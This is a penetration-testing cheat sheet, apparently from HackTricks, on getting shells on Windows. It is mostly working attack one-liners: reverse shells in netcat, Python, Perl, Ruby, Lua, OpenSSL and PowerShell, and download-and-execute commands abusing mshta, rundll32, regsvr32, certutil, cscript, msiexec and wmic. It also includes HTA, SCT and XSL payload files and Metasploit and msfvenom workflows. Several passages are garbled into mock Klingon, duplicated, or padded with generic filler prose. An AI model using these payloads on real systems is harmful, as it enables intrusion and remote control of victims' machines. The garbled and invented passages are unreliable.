# Shells - Windows

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

The page [lolbas-project.github.io](https://lolbas-project.github.io/) is for Windows like [https://gtfobins.github.io/](https://gtfobins.github.io/) is for linux.\
Obviously, **there aren't SUID files or sudo privileges in Windows**, but it's useful to know **how** some **binaries** can be (ab)used to perform some kind of unexpected actions like **execute arbitrary code.**

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/) HochmeH je netcat alternative**. vItlhutlh Unix-like systemmey je Win32. vItlhutlh encryption, program execution, customizable source ports, je continuous reconnection, sbd vItlhutlh TCP/IP communication solution. Windows users, sbd.exe version vItlhutlh Kali Linux distribution netcat replacement.
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## Python

### Introduction

Python is a versatile and powerful programming language that is widely used in the field of hacking. It provides a wide range of libraries and modules that can be leveraged for various hacking tasks. In this section, we will explore some of the key features and functionalities of Python that make it an excellent choice for hacking.

### Key Features of Python for Hacking

1. **Simplicity**: Python has a clean and easy-to-understand syntax, making it beginner-friendly and allowing hackers to quickly write and execute code.

2. **Portability**: Python is a cross-platform language, meaning that Python code can run on different operating systems without any modifications. This makes it convenient for hackers who need to work on multiple platforms.

3. **Extensibility**: Python allows hackers to easily extend its functionality by importing and using various libraries and modules. There are numerous libraries available for tasks such as network scanning, web scraping, cryptography, and more.

4. **Interactivity**: Python provides an interactive shell, which allows hackers to execute code line by line and see the results immediately. This makes it easier to debug and test code during the hacking process.

5. **Integration**: Python can be easily integrated with other languages, such as C and C++, allowing hackers to leverage existing code and libraries written in these languages.

### Python Libraries for Hacking

Python offers a wide range of libraries that can be used for hacking purposes. Some of the most commonly used libraries include:

- **Scapy**: A powerful packet manipulation library that allows hackers to create, send, and capture network packets.

- **Requests**: A library for making HTTP requests, which is useful for tasks such as web scraping and interacting with web applications.

- **Paramiko**: A library for SSH protocol implementation, which allows hackers to automate tasks such as remote command execution and file transfer.

- **Crypto**: A library that provides various cryptographic functions, such as encryption, decryption, hashing, and more.

- **BeautifulSoup**: A library for parsing HTML and XML documents, which is useful for web scraping and extracting data from websites.

### Conclusion

Python is a versatile and powerful programming language that is widely used in the field of hacking. Its simplicity, portability, extensibility, interactivity, and integration capabilities make it an excellent choice for hackers. By leveraging the various libraries available in Python, hackers can perform a wide range of hacking tasks efficiently and effectively.
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
Perl is a high-level programming language that is commonly used for scripting and automation tasks. It is known for its powerful text processing capabilities and its ability to work well with other programming languages. Perl scripts can be executed on various operating systems, including Windows.

Perl is often used by hackers for various purposes, such as writing exploit scripts or automating tasks during a penetration test. It provides a wide range of built-in functions and modules that can be leveraged for hacking activities.

When using Perl for hacking, it is important to have a good understanding of the language and its syntax. This includes knowledge of variables, control structures, regular expressions, and file handling. Additionally, familiarity with Perl modules that are commonly used in hacking, such as Net::FTP or Net::SSH, can be beneficial.

Perl can be installed on Windows by downloading and running the installer from the official Perl website. Once installed, Perl scripts can be executed from the command line by typing "perl" followed by the script name.

When writing Perl scripts for hacking purposes, it is important to follow best practices to ensure the code is secure and efficient. This includes sanitizing user input, properly handling errors, and using encryption when necessary.

Overall, Perl is a versatile programming language that can be a valuable tool for hackers. Its extensive functionality and cross-platform compatibility make it a popular choice for scripting and automation in the hacking community.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
### Introduction

Ruby is a dynamic, object-oriented programming language that is known for its simplicity and readability. It was created in the mid-1990s by Yukihiro Matsumoto, also known as Matz. Ruby has gained popularity among developers due to its elegant syntax and powerful features.

### Features

Ruby offers a wide range of features that make it a versatile language for various applications. Some of the key features of Ruby include:

1. **Dynamic Typing**: Ruby is dynamically typed, which means that variable types are determined at runtime. This allows for more flexibility and easier code maintenance.

2. **Object-Oriented**: Ruby is a fully object-oriented language, where everything is an object. This allows for the use of classes, inheritance, and polymorphism, making it easier to organize and structure code.

3. **Garbage Collection**: Ruby has built-in garbage collection, which automatically manages memory allocation and deallocation. This helps developers focus on writing code without worrying about memory management.

4. **Blocks and Procs**: Ruby supports blocks and procs, which are anonymous functions that can be passed as arguments to methods. This allows for more concise and expressive code.

5. **Metaprogramming**: Ruby has powerful metaprogramming capabilities, allowing developers to modify and extend the language itself. This enables the creation of domain-specific languages and flexible frameworks.

### Syntax

Ruby has a clean and readable syntax that is designed to be easy to understand and write. Here are some examples of Ruby syntax:

```ruby
# Variables
name = "John"
age = 25

# Conditionals
if age >= 18
  puts "You are an adult"
else
  puts "You are a minor"
end

# Loops
for i in 1..5
  puts i
end

# Methods
def greet(name)
  puts "Hello, #{name}!"
end

greet("Alice")
```

### Resources

There are many resources available for learning Ruby and improving your skills. Here are some recommended resources:

- [Ruby Documentation](https://ruby-doc.org/): The official documentation for Ruby, which provides detailed information about the language and its standard library.

- [RubyGems](https://rubygems.org/): A package manager for Ruby that allows you to easily install and manage libraries and frameworks.

- [Ruby Toolbox](https://www.ruby-toolbox.com/): A website that provides a curated list of Ruby libraries and tools, categorized by functionality.

- [Ruby on Rails](https://rubyonrails.org/): A popular web application framework built with Ruby. It provides a set of conventions and tools for building robust and scalable web applications.

- [RubyMine](https://www.jetbrains.com/ruby/): An integrated development environment (IDE) specifically designed for Ruby development. It offers advanced features such as code completion, debugging, and refactoring tools.

### Conclusion

Ruby is a powerful and expressive programming language that offers a wide range of features and a clean syntax. Whether you are a beginner or an experienced developer, learning Ruby can greatly enhance your programming skills and productivity.
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
### Introduction

Lua is a lightweight, high-level programming language designed primarily for embedded systems and scripting. It is often used as a scripting language in video games and other applications that require customizable behavior. Lua is known for its simplicity, efficiency, and ease of integration with other languages.

### Features

- **Lightweight**: Lua has a small footprint and minimal resource requirements, making it suitable for use in resource-constrained environments.
- **High-level**: Lua provides a simple and expressive syntax that is easy to read and write.
- **Embeddable**: Lua can be easily embedded into other applications, allowing developers to extend the functionality of their software.
- **Dynamic typing**: Lua uses dynamic typing, which means that variables do not have a fixed type and can be assigned values of different types at runtime.
- **Garbage collection**: Lua has automatic memory management through garbage collection, which helps developers avoid memory leaks and other memory-related issues.
- **Extensibility**: Lua can be extended with C/C++ code, allowing developers to leverage existing libraries and functionality.
- **Portability**: Lua is written in ANSI C and can be compiled and run on a wide range of platforms, including Windows, macOS, Linux, and various embedded systems.

### Usage

Lua can be used in a variety of ways, including:

- **Scripting**: Lua is often used as a scripting language in video games, allowing developers to define game logic and behavior in a flexible and customizable way.
- **Embedded systems**: Lua's small footprint and low resource requirements make it suitable for use in embedded systems, such as IoT devices and microcontrollers.
- **Extension language**: Lua can be embedded into other applications as an extension language, allowing developers to add scripting capabilities to their software.
- **Prototyping**: Lua's simplicity and ease of use make it a popular choice for rapid prototyping and experimentation.

### Conclusion

Lua is a versatile and lightweight programming language that is well-suited for embedded systems, scripting, and extension purposes. Its simplicity, efficiency, and ease of integration make it a popular choice among developers. Whether you are developing a video game, an IoT device, or a software application, Lua can be a valuable tool in your toolkit.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Attacker (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Windows Shells

## Introduction

In the context of hacking, a shell refers to a command-line interface that allows an attacker to interact with a compromised system. In this section, we will explore various methods to obtain and maintain a shell on a Windows machine.

## Reverse Shells

A reverse shell is a technique where the attacker sets up a listener on their machine and the compromised system connects back to it. This allows the attacker to gain remote access to the victim's machine.

### Netcat

Netcat is a versatile networking utility that can be used to create reverse shells. It is available for both Windows and Linux systems.

To create a reverse shell using Netcat on Windows, follow these steps:

1. Set up a listener on your machine: `nc -lvp <port>`

2. Execute the following command on the victim's machine: `nc <attacker_ip> <port> -e cmd.exe`

### PowerShell

PowerShell is a powerful scripting language that is built into Windows. It can be used to create reverse shells as well.

To create a reverse shell using PowerShell, follow these steps:

1. Set up a listener on your machine: `nc -lvp <port>`

2. Execute the following command on the victim's machine: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

## Web Shells

Web shells are scripts or programs that are uploaded to a compromised web server. They provide a web-based interface for an attacker to execute commands on the server.

### PHP Shell

PHP shells are one of the most common types of web shells. They are written in PHP and can be uploaded to a web server via various methods, such as file upload vulnerabilities or command injection.

To use a PHP shell, follow these steps:

1. Upload the PHP shell to the target web server.

2. Access the PHP shell through a web browser.

3. Use the provided interface to execute commands on the server.

### ASPX Shell

ASPX shells are web shells written in ASP.NET. They can be uploaded to a web server that supports ASP.NET applications.

To use an ASPX shell, follow these steps:

1. Upload the ASPX shell to the target web server.

2. Access the ASPX shell through a web browser.

3. Use the provided interface to execute commands on the server.

## Conclusion

Obtaining and maintaining a shell on a Windows machine is a crucial step in the hacking process. Reverse shells and web shells are powerful techniques that allow attackers to gain remote access and execute commands on compromised systems. It is important for both attackers and defenders to understand these methods in order to protect against them.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

### Introduction

Powershell is a powerful scripting language and automation framework developed by Microsoft. It is designed specifically for system administration and task automation on Windows operating systems. With its extensive set of commands and features, Powershell provides a versatile environment for managing and controlling Windows systems.

### Features

Powershell offers several key features that make it a popular choice among system administrators and hackers:

- **Command-line interface**: Powershell provides a command-line interface (CLI) that allows users to interact with the operating system and execute commands. This makes it easy to perform various tasks and automate repetitive actions.

- **Scripting language**: Powershell is a full-fledged scripting language that supports variables, loops, conditionals, and other programming constructs. This allows users to write complex scripts to automate tasks and perform system administration tasks.

- **Object-oriented**: Powershell treats everything as an object, including files, processes, and registry keys. This object-oriented approach makes it easy to manipulate and manage system resources.

- **Integration with .NET**: Powershell is built on top of the .NET framework, which provides access to a wide range of libraries and APIs. This allows users to leverage the power of .NET to perform advanced tasks and interact with external systems.

### Basic Usage

To start Powershell, open a command prompt and type `powershell`. This will launch the Powershell CLI, where you can start executing commands and running scripts.

Here are some basic commands to get you started:

- `Get-Process`: Lists all running processes on the system.
- `Get-Service`: Lists all installed services on the system.
- `Get-ChildItem`: Lists all files and directories in the current directory.
- `Set-ExecutionPolicy`: Sets the execution policy for Powershell scripts.
- `Invoke-Expression`: Executes a string as a command.

### Advanced Usage

Powershell provides a wide range of advanced features and capabilities. Here are some examples:

- **Remote administration**: Powershell can be used to remotely manage and administer Windows systems. It supports remote execution of commands and scripts, allowing administrators to perform tasks on multiple machines simultaneously.

- **Script execution**: Powershell scripts can be executed in various ways, including running them directly from the command line, scheduling them to run at specific times, or embedding them in other scripts or applications.

- **Module system**: Powershell supports the use of modules, which are collections of functions and scripts that can be imported and used in other scripts. This allows users to extend the functionality of Powershell and reuse code.

- **PowerShell Gallery**: The PowerShell Gallery is a repository of Powershell modules and scripts that can be downloaded and used by the community. It provides a convenient way to discover and share Powershell resources.

### Conclusion

Powershell is a versatile and powerful tool for system administration and automation on Windows systems. Its extensive set of commands and features make it a valuable asset for both system administrators and hackers. By mastering Powershell, you can streamline your workflow, automate repetitive tasks, and gain greater control over Windows systems.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
**powershell.exe** jolchugh network call yIngu'\
Payload written on disk: **NO** (_procmon jatlhlaHbe'chugh yIngu'!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
**svchost.exe** jatlhpu' network call yIngu'\
**WebDAV client local cache** DIvI' yIghItlhpu' payload
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Get more info about different Powershell Shells at the end of this document**

## Mshta

* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **Example of hta-psh reverse shell (use hta to download and execute PS backdoor)**

#### **hta-psh reverse shell jatlh (hta vItlhutlh je PS backdoor download je execute)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**tlhIngan Hol:**
**jIyItlhutlh:** 
**vaj:** 
[**ghaH**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**ghItlh**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

##### **Description**

The `mshta` module in Metasploit Framework is used to exploit the Windows `mshta.exe` utility. This utility is responsible for executing HTML applications (HTAs) on Windows systems. By exploiting `mshta.exe`, an attacker can execute arbitrary code on the target system.

##### **Usage**

To use the `mshta` module, follow these steps:

1. Set the `RHOST` option to the IP address of the target system.
2. Set the `PAYLOAD` option to the desired payload.
3. Set the `LHOST` option to the IP address of the attacking machine.
4. Run the exploit using the `exploit` command.

##### **Example**

```
msf5 > use exploit/windows/browser/mshta
msf5 exploit(windows/browser/mshta) > set RHOST 192.168.1.10
msf5 exploit(windows/browser/mshta) > set PAYLOAD windows/meterpreter/reverse_tcp
msf5 exploit(windows/browser/mshta) > set LHOST 192.168.1.20
msf5 exploit(windows/browser/mshta) > exploit
```

##### **References**

- [Metasploit Unleashed - Mshta](https://www.metasploitunleashed.org/)

##### **Author**

- [@harmj0y](https://twitter.com/harmj0y)
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**QaH Detected by defender**




## **Rundll32**

[**Dll ghuy'cha' example**](https://github.com/carterjones/hello-world-dll)

* [vaj](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
**ghItlh by defender**

**Rundll32 - sct**

[**ghItlh**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files. Metasploit is a popular framework used for penetration testing and exploiting vulnerabilities. By leveraging the Rundll32 utility in combination with Metasploit, an attacker can execute malicious code on a target system.

To use Rundll32 with Metasploit, follow these steps:

1. Generate a payload using Metasploit's payload generator.
2. Save the payload as a DLL file.
3. Transfer the DLL file to the target system.
4. Use Rundll32 to execute the DLL file on the target system.

The following command can be used to execute the DLL file using Rundll32:

```
rundll32.exe <path_to_dll_file>,<entry_point_function>
```

Replace `<path_to_dll_file>` with the path to the DLL file on the target system, and `<entry_point_function>` with the name of the function to be executed within the DLL.

By exploiting vulnerabilities and using Rundll32 with Metasploit, an attacker can gain unauthorized access to a target system and perform various malicious activities. It is important to note that these techniques should only be used for ethical purposes, such as penetration testing, and with proper authorization.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files. It can be used by hackers to load malicious DLLs and execute their code. One popular tool that leverages Rundll32 for hacking purposes is Koadic.

Koadic is a post-exploitation RAT (Remote Access Trojan) that provides a command-and-control interface to interact with compromised Windows systems. It uses Rundll32 to load its DLL payload into memory and execute it.

To use Koadic, the attacker first needs to gain access to the target system. This can be achieved through various means, such as exploiting vulnerabilities, social engineering, or brute-forcing credentials. Once inside, the attacker can use Koadic to perform various malicious activities, such as stealing sensitive information, executing commands, or even taking full control of the compromised system.

Koadic provides a wide range of features and functionalities, including the ability to bypass antivirus detection, escalate privileges, and maintain persistence on the compromised system. It also supports multiple communication channels, such as HTTP, DNS, and ICMP, to establish communication with the attacker's command-and-control server.

It is important to note that the use of Rundll32 and Koadic for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security risks and help organizations protect their systems from such attacks.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

### tlhIngan Hol

* [ghItlh](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**Qapla'!**

#### Regsvr32 -sct

[**ghItlh**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**nuqneH:** 
* [ghap 'ej execute Koadic zombie vItlhutlhlaH regsvr stager](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

Certutil:
* [vaj 'ej](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) 

B64dll download, decode, 'ej execute.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
**Translation:**

**Download a B64exe, decode it and execute it.**

**Translation (Klingon):**

**B64exe vItlhutlh, vItlhutlh je vItlhutlh.**

**Translation (Markdown):**

**Download a B64exe, decode it and execute it.**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Qa'vIn Defender Daq yIlo'**

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

vulnerabilities vItlhutlhlaHvIS, vItlhutlh scans proactive threat, vItlhutlh issues tech stack, APIs web apps cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used for running VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

When it comes to using Cscript with Metasploit, there are a few techniques that can be employed. One common approach is to use Cscript to execute a malicious VBScript or JScript payload generated by Metasploit. This payload can be designed to exploit vulnerabilities in the target system and provide the attacker with remote access or control.

To execute a Metasploit payload using Cscript, the following steps can be followed:

1. Generate the payload using Metasploit. This can be done using the `msfvenom` command, specifying the desired payload type, target architecture, and other relevant options.

2. Save the generated payload as a VBScript or JScript file, with a `.vbs` or `.js` extension, respectively.

3. Transfer the payload file to the target system. This can be done using various methods, such as uploading it to a compromised web server, sending it via email, or using other file transfer techniques.

4. On the target system, open a command prompt and navigate to the directory where the payload file is located.

5. Execute the payload using Cscript by running the following command: `cscript payload.vbs` or `cscript payload.js`, depending on the file extension.

6. If successful, the payload will be executed, and the attacker will gain remote access or control over the target system.

It is important to note that using Cscript with Metasploit requires careful planning and consideration of the target system's security measures. Additionally, it is crucial to ensure that the actions performed are legal and within the scope of authorized penetration testing activities.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Qap by defender**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
**svchost.exe** jatlhpu' network call yIngu'\
Payload written on disk: **WebDAV client local cache**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Qa'vIn Defender**

## **MSIExec**

Qa'vInpu' 'e' yIDel

## **MSIExec**

Qa'vInpu' 'e' yIDel
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
**Victim:**

The victim is the target of the hacking attack. It refers to the individual, organization, or system that the hacker intends to compromise or gain unauthorized access to. Understanding the victim's vulnerabilities, weaknesses, and potential entry points is crucial for a successful hacking attempt.
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Qap**

## **Wmic**

* [Qa'pu'](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
Example xsl file [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**ghItlhvam**

